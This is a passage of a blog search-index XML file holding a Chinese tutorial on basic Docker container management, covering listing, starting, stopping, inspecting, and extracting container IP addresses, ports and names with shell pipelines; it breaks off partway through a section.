<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python3实现Docker基本管理</title>
      <link href="/2020/04/08/python3-shi-xian-docker-ji-ben-guan-li/"/>
      <url>/2020/04/08/python3-shi-xian-docker-ji-ben-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="Python3实现Docker基本管理"><a href="#Python3实现Docker基本管理" class="headerlink" title="Python3实现Docker基本管理"></a>Python3实现Docker基本管理</h1><h2 id="一、预备知识"><a href="#一、预备知识" class="headerlink" title="一、预备知识"></a>一、预备知识</h2><ul><li>Docker</li><li>Linux</li><li>Python</li></ul><h3 id="1、Docker基本命令"><a href="#1、Docker基本命令" class="headerlink" title="1、Docker基本命令"></a>1、Docker基本命令</h3><h4 id="1-1、查看已有的镜像"><a href="#1-1、查看已有的镜像" class="headerlink" title="1.1、查看已有的镜像"></a>1.1、查看已有的镜像</h4><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker imagesREPOSITORY             TAG                 IMAGE ID            CREATED             SIZEmysql                  5.7                 84164b03fa2e        5 weeks ago         456MBwordpress              latest              126aa00ecc0c        5 weeks ago         540MBkennethreitz/httpbin   latest              b138b9264903        17 months ago       534MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2、查看已创建的容器"><a href="#1-2、查看已创建的容器" class="headerlink" title="1.2、查看已创建的容器"></a>1.2、查看已创建的容器</h4><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker <span class="token function">ps</span> -aCONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS                       PORTS                               NAMES8163d8d1e277        wordpress:latest       <span class="token string">"docker-entrypoint.s…"</span>   3 weeks ago         Exited <span class="token punctuation">(</span>255<span class="token punctuation">)</span> 5 minutes ago   0.0.0.0:8001-<span class="token operator">></span>80/tcp                wordpress2f23a0ef7add        mysql:5.7              <span class="token string">"docker-entrypoint.s…"</span>   3 weeks ago         Exited <span class="token punctuation">(</span>255<span class="token punctuation">)</span> 5 minutes ago   0.0.0.0:3306-<span class="token operator">></span>3306/tcp, 33060/tcp   db.wordpress1c70a141029c        kennethreitz/httpbin   <span class="token string">"gunicorn -b 0.0.0.0…"</span>   4 weeks ago         Exited <span class="token punctuation">(</span>255<span class="token punctuation">)</span> 5 minutes ago   0.0.0.0:80-<span class="token operator">></span>80/tcp                  httpbin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-3、查看正在运行的容器的CONTAINER-ID"><a href="#1-3、查看正在运行的容器的CONTAINER-ID" class="headerlink" title="1.3、查看正在运行的容器的CONTAINER ID"></a>1.3、查看正在运行的容器的CONTAINER ID</h4><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker <span class="token function">ps</span> -q1c70a141029c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="1-4、启动一个容器"><a href="#1-4、启动一个容器" class="headerlink" title="1.4、启动一个容器"></a>1.4、启动一个容器</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker start container_id</span>➜  ~ docker start 1c70a141029c1c70a141029c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-5、关闭一个容器"><a href="#1-5、关闭一个容器" class="headerlink" title="1.5、关闭一个容器"></a>1.5、关闭一个容器</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker stop container_id</span>➜  ~ docker stop 1c70a141029c1c70a141029c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-6、重启一个容器"><a href="#1-6、重启一个容器" class="headerlink" title="1.6、重启一个容器"></a>1.6、重启一个容器</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker restart container_id</span>➜  ~ docker restart 1c70a141029c1c70a141029c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-7、查看一个容器的详细信息"><a href="#1-7、查看一个容器的详细信息" class="headerlink" title="1.7、查看一个容器的详细信息"></a>1.7、查看一个容器的详细信息</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker inspect container_id</span>➜  ~ docker inspect 1c70a141029c<span class="token punctuation">[</span>    <span class="token punctuation">{</span>        <span class="token string">"Id"</span><span class="token keyword">:</span> <span class="token string">"1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a"</span>,        <span class="token string">"Created"</span><span class="token keyword">:</span> <span class="token string">"2020-03-09T15:37:42.352346164Z"</span>,        <span class="token string">"Path"</span><span class="token keyword">:</span> <span class="token string">"gunicorn"</span>,        <span class="token string">"Args"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>            <span class="token string">"-b"</span>,            <span class="token string">"0.0.0.0:80"</span>,            <span class="token string">"httpbin:app"</span>,            <span class="token string">"-k"</span>,            <span class="token string">"gevent"</span>        <span class="token punctuation">]</span>,        <span class="token string">"State"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>            <span class="token string">"Status"</span><span class="token keyword">:</span> <span class="token string">"running"</span>,            <span class="token string">"Running"</span><span class="token keyword">:</span> true,            <span class="token string">"Paused"</span><span class="token keyword">:</span> false,            <span class="token string">"Restarting"</span><span class="token keyword">:</span> false,            <span class="token string">"OOMKilled"</span><span class="token keyword">:</span> false,            <span class="token string">"Dead"</span><span class="token keyword">:</span> false,            <span class="token string">"Pid"</span><span class="token keyword">:</span> 3829,            <span class="token string">"ExitCode"</span><span class="token keyword">:</span> 0,            <span class="token string">"Error"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"StartedAt"</span><span class="token keyword">:</span> <span class="token string">"2020-04-08T23:29:38.049792725Z"</span>,            <span class="token string">"FinishedAt"</span><span class="token keyword">:</span> <span class="token string">"2020-04-08T23:29:37.29916778Z"</span>        <span class="token punctuation">}</span>,        <span class="token string">"Image"</span><span class="token keyword">:</span> <span class="token string">"sha256:b138b9264903f46a43e1c750e07dc06f5d2a1bd5d51f37fb185bc608f61090dd"</span>,        <span class="token string">"ResolvConfPath"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/containers/1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a/resolv.conf"</span>,        <span class="token string">"HostnamePath"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/containers/1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a/hostname"</span>,        <span class="token string">"HostsPath"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/containers/1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a/hosts"</span>,        <span class="token string">"LogPath"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/containers/1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a/1c70a141029c02e94cc88fcd3ef9f8bbdb648331765c24709abf9448df8d282a-json.log"</span>,        <span class="token string">"Name"</span><span class="token keyword">:</span> <span class="token string">"/httpbin"</span>,        <span class="token string">"RestartCount"</span><span class="token keyword">:</span> 0,        <span class="token string">"Driver"</span><span class="token keyword">:</span> <span class="token string">"overlay2"</span>,        <span class="token string">"Platform"</span><span class="token keyword">:</span> <span class="token string">"linux"</span>,        <span class="token string">"MountLabel"</span><span class="token keyword">:</span> <span class="token string">""</span>,        <span class="token string">"ProcessLabel"</span><span class="token keyword">:</span> <span class="token string">""</span>,        <span class="token string">"AppArmorProfile"</span><span class="token keyword">:</span> <span class="token string">"docker-default"</span>,        <span class="token string">"ExecIDs"</span><span class="token keyword">:</span> null,        <span class="token string">"HostConfig"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>            <span class="token string">"Binds"</span><span class="token keyword">:</span> null,            <span class="token string">"ContainerIDFile"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"LogConfig"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"Type"</span><span class="token keyword">:</span> <span class="token string">"json-file"</span>,                <span class="token string">"Config"</span><span class="token keyword">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>            <span class="token punctuation">}</span>,            <span class="token string">"NetworkMode"</span><span class="token keyword">:</span> <span class="token string">"default"</span>,            <span class="token string">"PortBindings"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"80/tcp"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                    <span class="token punctuation">{</span>                        <span class="token string">"HostIp"</span><span class="token keyword">:</span> <span class="token string">""</span>,                        <span class="token string">"HostPort"</span><span class="token keyword">:</span> <span class="token string">"80"</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">]</span>            <span class="token punctuation">}</span>,            <span class="token string">"RestartPolicy"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"Name"</span><span class="token keyword">:</span> <span class="token string">"no"</span>,                <span class="token string">"MaximumRetryCount"</span><span class="token keyword">:</span> 0            <span class="token punctuation">}</span>,            <span class="token string">"AutoRemove"</span><span class="token keyword">:</span> false,            <span class="token string">"VolumeDriver"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"VolumesFrom"</span><span class="token keyword">:</span> null,            <span class="token string">"CapAdd"</span><span class="token keyword">:</span> null,            <span class="token string">"CapDrop"</span><span class="token keyword">:</span> null,            <span class="token string">"Dns"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"DnsOptions"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"DnsSearch"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"ExtraHosts"</span><span class="token keyword">:</span> null,            <span class="token string">"GroupAdd"</span><span class="token keyword">:</span> null,            <span class="token string">"IpcMode"</span><span class="token keyword">:</span> <span class="token string">"shareable"</span>,            <span class="token string">"Cgroup"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"Links"</span><span class="token keyword">:</span> null,            <span class="token string">"OomScoreAdj"</span><span class="token keyword">:</span> 0,            <span class="token string">"PidMode"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"Privileged"</span><span class="token keyword">:</span> false,            <span class="token string">"PublishAllPorts"</span><span class="token keyword">:</span> false,            <span class="token string">"ReadonlyRootfs"</span><span class="token keyword">:</span> false,            <span class="token string">"SecurityOpt"</span><span class="token keyword">:</span> null,            <span class="token string">"UTSMode"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"UsernsMode"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"ShmSize"</span><span class="token keyword">:</span> 67108864,            <span class="token string">"Runtime"</span><span class="token keyword">:</span> <span class="token string">"runc"</span>,            <span class="token string">"ConsoleSize"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                0,                0            <span class="token punctuation">]</span>,            <span class="token string">"Isolation"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"CpuShares"</span><span class="token keyword">:</span> 0,            <span class="token string">"Memory"</span><span class="token keyword">:</span> 0,            <span class="token string">"NanoCpus"</span><span class="token keyword">:</span> 0,            <span class="token string">"CgroupParent"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"BlkioWeight"</span><span class="token keyword">:</span> 0,            <span class="token string">"BlkioWeightDevice"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"BlkioDeviceReadBps"</span><span class="token keyword">:</span> null,            <span class="token string">"BlkioDeviceWriteBps"</span><span class="token keyword">:</span> null,            <span class="token string">"BlkioDeviceReadIOps"</span><span class="token keyword">:</span> null,            <span class="token string">"BlkioDeviceWriteIOps"</span><span class="token keyword">:</span> null,            <span class="token string">"CpuPeriod"</span><span class="token keyword">:</span> 0,            <span class="token string">"CpuQuota"</span><span class="token keyword">:</span> 0,            <span class="token string">"CpuRealtimePeriod"</span><span class="token keyword">:</span> 0,            <span class="token string">"CpuRealtimeRuntime"</span><span class="token keyword">:</span> 0,            <span class="token string">"CpusetCpus"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"CpusetMems"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"Devices"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,            <span class="token string">"DeviceCgroupRules"</span><span class="token keyword">:</span> null,            <span class="token string">"DiskQuota"</span><span class="token keyword">:</span> 0,            <span class="token string">"KernelMemory"</span><span class="token keyword">:</span> 0,            <span class="token string">"MemoryReservation"</span><span class="token keyword">:</span> 0,            <span class="token string">"MemorySwap"</span><span class="token keyword">:</span> 0,            <span class="token string">"MemorySwappiness"</span><span class="token keyword">:</span> null,            <span class="token string">"OomKillDisable"</span><span class="token keyword">:</span> false,            <span class="token string">"PidsLimit"</span><span class="token keyword">:</span> 0,            <span class="token string">"Ulimits"</span><span class="token keyword">:</span> null,            <span class="token string">"CpuCount"</span><span class="token keyword">:</span> 0,            <span class="token string">"CpuPercent"</span><span class="token keyword">:</span> 0,            <span class="token string">"IOMaximumIOps"</span><span class="token keyword">:</span> 0,            <span class="token string">"IOMaximumBandwidth"</span><span class="token keyword">:</span> 0,            <span class="token string">"MaskedPaths"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                <span class="token string">"/proc/acpi"</span>,                <span class="token string">"/proc/kcore"</span>,                <span class="token string">"/proc/keys"</span>,                <span class="token string">"/proc/latency_stats"</span>,                <span class="token string">"/proc/timer_list"</span>,                <span class="token string">"/proc/timer_stats"</span>,                <span class="token string">"/proc/sched_debug"</span>,                <span class="token string">"/proc/scsi"</span>,                <span class="token string">"/sys/firmware"</span>            <span class="token punctuation">]</span>,            <span class="token string">"ReadonlyPaths"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                <span class="token string">"/proc/asound"</span>,                <span class="token string">"/proc/bus"</span>,                <span class="token string">"/proc/fs"</span>,                <span class="token string">"/proc/irq"</span>,                <span class="token string">"/proc/sys"</span>,                <span class="token string">"/proc/sysrq-trigger"</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span>,        <span class="token string">"GraphDriver"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>            <span class="token string">"Data"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"LowerDir"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/overlay2/3bfff4d0957fa767bbf9a87564ac5aab092cbf0c4a3d454670d5f41730217b29-init/diff:/var/lib/docker/overlay2/7024e644c3cff797ddf664853271c501ca3153c700aa97183d8f11eb80ecb868/diff:/var/lib/docker/overlay2/05179366f7391597f28b1374de7f309939f924de7fdf759ce44af5f6345c5ca2/diff:/var/lib/docker/overlay2/e312ea37ad0b82784b3dc2432afe8006c138153264ffbb0b9494751edff96894/diff:/var/lib/docker/overlay2/5d6b92d36705697b6b65a5f82201f30c4f1ea8d73420f06869b0ba4120ed023d/diff:/var/lib/docker/overlay2/811021bd290cb003ed2e6b74b133354bbbea68acd198af64e10b09db5e63853d/diff:/var/lib/docker/overlay2/a63a3f457b76c1cb0c052a5dda2a8db2364975e8f89f1bae56d69fda57bdb8b4/diff:/var/lib/docker/overlay2/95b71e3f4a74b2924f402843f6ee47b86605ea86981eceff8ed3e2e987dd9824/diff"</span>,                <span class="token string">"MergedDir"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/overlay2/3bfff4d0957fa767bbf9a87564ac5aab092cbf0c4a3d454670d5f41730217b29/merged"</span>,                <span class="token string">"UpperDir"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/overlay2/3bfff4d0957fa767bbf9a87564ac5aab092cbf0c4a3d454670d5f41730217b29/diff"</span>,                <span class="token string">"WorkDir"</span><span class="token keyword">:</span> <span class="token string">"/var/lib/docker/overlay2/3bfff4d0957fa767bbf9a87564ac5aab092cbf0c4a3d454670d5f41730217b29/work"</span>            <span class="token punctuation">}</span>,            <span class="token string">"Name"</span><span class="token keyword">:</span> <span class="token string">"overlay2"</span>        <span class="token punctuation">}</span>,        <span class="token string">"Mounts"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,        <span class="token string">"Config"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>            <span class="token string">"Hostname"</span><span class="token keyword">:</span> <span class="token string">"1c70a141029c"</span>,            <span class="token string">"Domainname"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"User"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"AttachStdin"</span><span class="token keyword">:</span> false,            <span class="token string">"AttachStdout"</span><span class="token keyword">:</span> false,            <span class="token string">"AttachStderr"</span><span class="token keyword">:</span> false,            <span class="token string">"ExposedPorts"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"80/tcp"</span><span class="token keyword">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>            <span class="token punctuation">}</span>,            <span class="token string">"Tty"</span><span class="token keyword">:</span> false,            <span class="token string">"OpenStdin"</span><span class="token keyword">:</span> false,            <span class="token string">"StdinOnce"</span><span class="token keyword">:</span> false,            <span class="token string">"Env"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                <span class="token string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>            <span class="token punctuation">]</span>,            <span class="token string">"Cmd"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                <span class="token string">"gunicorn"</span>,                <span class="token string">"-b"</span>,                <span class="token string">"0.0.0.0:80"</span>,                <span class="token string">"httpbin:app"</span>,                <span class="token string">"-k"</span>,                <span class="token string">"gevent"</span>            <span class="token punctuation">]</span>,            <span class="token string">"ArgsEscaped"</span><span class="token keyword">:</span> true,            <span class="token string">"Image"</span><span class="token keyword">:</span> <span class="token string">"kennethreitz/httpbin"</span>,            <span class="token string">"Volumes"</span><span class="token keyword">:</span> null,            <span class="token string">"WorkingDir"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"Entrypoint"</span><span class="token keyword">:</span> null,            <span class="token string">"OnBuild"</span><span class="token keyword">:</span> null,            <span class="token string">"Labels"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"description"</span><span class="token keyword">:</span> <span class="token string">"A simple HTTP service."</span>,                <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"httpbin"</span>,                <span class="token string">"org.kennethreitz.vendor"</span><span class="token keyword">:</span> <span class="token string">"Kenneth Reitz"</span>,                <span class="token string">"version"</span><span class="token keyword">:</span> <span class="token string">"0.9.2"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>,        <span class="token string">"NetworkSettings"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>            <span class="token string">"Bridge"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"SandboxID"</span><span class="token keyword">:</span> <span class="token string">"d52a556de3d8482e4ad7f6885edff5526a4edd685b6139a65f4a077e0523cace"</span>,            <span class="token string">"HairpinMode"</span><span class="token keyword">:</span> false,            <span class="token string">"LinkLocalIPv6Address"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"LinkLocalIPv6PrefixLen"</span><span class="token keyword">:</span> 0,            <span class="token string">"Ports"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"80/tcp"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>                    <span class="token punctuation">{</span>                        <span class="token string">"HostIp"</span><span class="token keyword">:</span> <span class="token string">"0.0.0.0"</span>,                        <span class="token string">"HostPort"</span><span class="token keyword">:</span> <span class="token string">"80"</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">]</span>            <span class="token punctuation">}</span>,            <span class="token string">"SandboxKey"</span><span class="token keyword">:</span> <span class="token string">"/var/run/docker/netns/d52a556de3d8"</span>,            <span class="token string">"SecondaryIPAddresses"</span><span class="token keyword">:</span> null,            <span class="token string">"SecondaryIPv6Addresses"</span><span class="token keyword">:</span> null,            <span class="token string">"EndpointID"</span><span class="token keyword">:</span> <span class="token string">"36bbb91a9b616841e6120477b6b5c6068cccc7a9f0e3390dc7529e98851f6bec"</span>,            <span class="token string">"Gateway"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.1"</span>,            <span class="token string">"GlobalIPv6Address"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"GlobalIPv6PrefixLen"</span><span class="token keyword">:</span> 0,            <span class="token string">"IPAddress"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.2"</span>,            <span class="token string">"IPPrefixLen"</span><span class="token keyword">:</span> 16,            <span class="token string">"IPv6Gateway"</span><span class="token keyword">:</span> <span class="token string">""</span>,            <span class="token string">"MacAddress"</span><span class="token keyword">:</span> <span class="token string">"02:42:ac:11:00:02"</span>,            <span class="token string">"Networks"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                <span class="token string">"bridge"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>                    <span class="token string">"IPAMConfig"</span><span class="token keyword">:</span> null,                    <span class="token string">"Links"</span><span class="token keyword">:</span> null,                    <span class="token string">"Aliases"</span><span class="token keyword">:</span> null,                    <span class="token string">"NetworkID"</span><span class="token keyword">:</span> <span class="token string">"dd6a0257d3dcbeb0e97e4d8095274769be43580bfa72fcd6082a9f53f3c91b1d"</span>,                    <span class="token string">"EndpointID"</span><span class="token keyword">:</span> <span class="token string">"36bbb91a9b616841e6120477b6b5c6068cccc7a9f0e3390dc7529e98851f6bec"</span>,                    <span class="token string">"Gateway"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.1"</span>,                    <span class="token string">"IPAddress"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.2"</span>,                    <span class="token string">"IPPrefixLen"</span><span class="token keyword">:</span> 16,                    <span class="token string">"IPv6Gateway"</span><span class="token keyword">:</span> <span class="token string">""</span>,                    <span class="token string">"GlobalIPv6Address"</span><span class="token keyword">:</span> <span class="token string">""</span>,                    <span class="token string">"GlobalIPv6PrefixLen"</span><span class="token keyword">:</span> 0,                    <span class="token string">"MacAddress"</span><span class="token keyword">:</span> <span class="token string">"02:42:ac:11:00:02"</span>,                    <span class="token string">"DriverOpts"</span><span class="token keyword">:</span> null                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-8、查看正在运行的容器的IP地址（或所有）"><a href="#1-8、查看正在运行的容器的IP地址（或所有）" class="headerlink" title="1.8、查看正在运行的容器的IP地址（或所有）"></a>1.8、查看正在运行的容器的IP地址（或所有）</h4><h5 id="1-8-1、第一种方式"><a href="#1-8-1、第一种方式" class="headerlink" title="1.8.1、第一种方式"></a>1.8.1、第一种方式</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker inspect --format '{{ .NetworkSettings.IPAddress }}' container_id</span>~ docker inspect --format <span class="token string">'{{ .NetworkSettings.IPAddress }}'</span> 1c70a141029c172.17.0.2<span class="token comment" spellcheck="true">#这里其实是docker inspect 的一种属性查询，从NetworkSettings找到IPAddress这个属性即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="1-8-2、第二种方式"><a href="#1-8-2、第二种方式" class="headerlink" title="1.8.2、第二种方式"></a>1.8.2、第二种方式</h5><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker inspect -f <span class="token string">'{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'</span> 1c70a141029c172.17.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="1-8-、第三种方式"><a href="#1-8-、第三种方式" class="headerlink" title="1.8.、第三种方式"></a>1.8.、第三种方式</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#这里借用Linux系统命令将docker inspect的信息作为输入来进行处理，不会的命令可以看Linux基本命令这一节</span>➜  ~ docker inspect 1c70a141029c <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"IPAddress"</span> <span class="token operator">|</span> <span class="token function">tail</span> -n 1<span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">':'</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span> <span class="token operator">|</span> <span class="token function">cut</span> -b 3-12 172.17.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="1-8-4、查看所有正在运行的容器的IP地址"><a href="#1-8-4、查看所有正在运行的容器的IP地址" class="headerlink" title="1.8.4、查看所有正在运行的容器的IP地址"></a>1.8.4、查看所有正在运行的容器的IP地址</h5><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker inspect --format<span class="token operator">=</span><span class="token string">'{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'</span> <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -aq<span class="token variable">)</span></span>/wordpress - 172.17.0.4/db.wordpress - 172.17.0.3/httpbin - 172.17.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-9、查看容器映射的端口"><a href="#1-9、查看容器映射的端口" class="headerlink" title="1.9、查看容器映射的端口"></a>1.9、查看容器映射的端口</h4><h5 id="1-9-1、第一种方式"><a href="#1-9-1、第一种方式" class="headerlink" title="1.9.1、第一种方式"></a>1.9.1、第一种方式</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker port 与docker container port命令执行起来得到的结果一样</span>➜  ~ docker port 2f23a0ef7add3306/tcp -<span class="token operator">></span> 0.0.0.0:3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="1-9-2、第二种方式"><a href="#1-9-2、第二种方式" class="headerlink" title="1.9.2、第二种方式"></a>1.9.2、第二种方式</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#这样可以直接看到正在映射过去的端口，缺点是无法看到映射前的端口</span>➜  ~ docker inspect 2f23a0ef7add  <span class="token operator">|</span> <span class="token function">grep</span> HostPort <span class="token operator">|</span> <span class="token function">head</span> -n 1 <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">':'</span> <span class="token string">'{print<span class="token variable">$2</span>}'</span> <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">' '</span> <span class="token string">'{print <span class="token variable">$1</span>}'</span> <span class="token operator">|</span> <span class="token function">sed</span>  $<span class="token string">'s/\"//g'</span>3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-10、查看容器的名称"><a href="#1-10、查看容器的名称" class="headerlink" title="1.10、查看容器的名称"></a>1.10、查看容器的名称</h4><h5 id="1-10-1、查看正在运行的的容器的名称"><a href="#1-10-1、查看正在运行的的容器的名称" class="headerlink" title="1.10.1、查看正在运行的的容器的名称"></a>1.10.1、查看正在运行的的容器的名称</h5><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker <span class="token function">ps</span> -a <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Up"</span> <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">" "</span> <span class="token string">'{print <span class="token variable">$NF</span>}'</span> <span class="token operator">|</span> <span class="token function">grep</span> -v NAMEShttpbin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="1-10-2、查看所有的容器的名称"><a href="#1-10-2、查看所有的容器的名称" class="headerlink" title="1.10.2、查看所有的容器的名称"></a>1.10.2、查看所有的容器的名称</h5><pre class="line-numbers language-bash"><code 